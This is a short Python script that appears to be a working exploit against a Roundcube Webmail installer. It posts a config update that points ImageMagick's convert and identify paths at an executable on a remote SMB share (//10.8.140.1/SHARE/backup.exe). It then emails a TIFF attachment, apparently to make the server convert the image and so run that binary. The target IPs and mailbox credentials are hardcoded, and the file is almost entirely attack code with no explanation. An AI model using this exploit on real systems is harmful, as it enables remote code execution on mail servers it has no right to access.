import requests
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication
from email.mime.image import MIMEImage

class EmailSender:
    def __init__(self, smtp_server, smtp_port, username, password):
        self.smtp_server = smtp_server
        self.smtp_port = smtp_port
        self.username = username
        self.password = password

    def send_mail(self, to_email, subject, body, file_paths=None):
        msg = MIMEMultipart()
        msg['From'] = self.username
        msg['To'] = to_email
        msg['Subject'] = subject
        msg.attach(MIMEText(body, 'plain'))

        if file_paths:
            for file_path in file_paths:
                with open(file_path, 'rb') as f:
                    file_content = f.read()
                    filename = file_path.split('/')[-1]
                    if filename.lower().endswith(('.png', '.jpg', '.gif', '.tiff', '.tif')):
                        attachment = MIMEImage(file_content, _subtype='tiff' if filename.lower().endswith(('.tiff', '.tif')) else None)
                    else:
                        attachment = MIMEApplication(file_content)
                    attachment.add_header('Content-Disposition', 'attachment', filename=filename)
                    msg.attach(attachment)

        server = smtplib.SMTP(self.smtp_server, self.smtp_port)
        server.starttls()
        server.login(self.username, self.password)
        server.send_message(msg)
        server.quit()

def make_request():
    url = "http://10.10.100.104/installer/index.php"
    data = {"_step": "2", "_product_name": "Roundcube Webmail", "_im_convert_path": "//10.8.140.1/SHARE/backup.exe","_im_identify_path": "//10.8.140.1/SHARE/backup.exe","submit": "UPDATE CONFIG"}
    return requests.post(url, data=data)

if __name__ == "__main__":
    response = make_request()
    print(f"Status: {response.status_code}")

    sender = EmailSender("10.10.100.104", 587, "roundcube156@abc.com", "roundcube156")
    file_paths = ["C:/path/to/file.tiff"]  
    sender.send_mail("roundcube156@abc.com", "Test TIFF Email", "This is a test with TIFF.", file_paths)
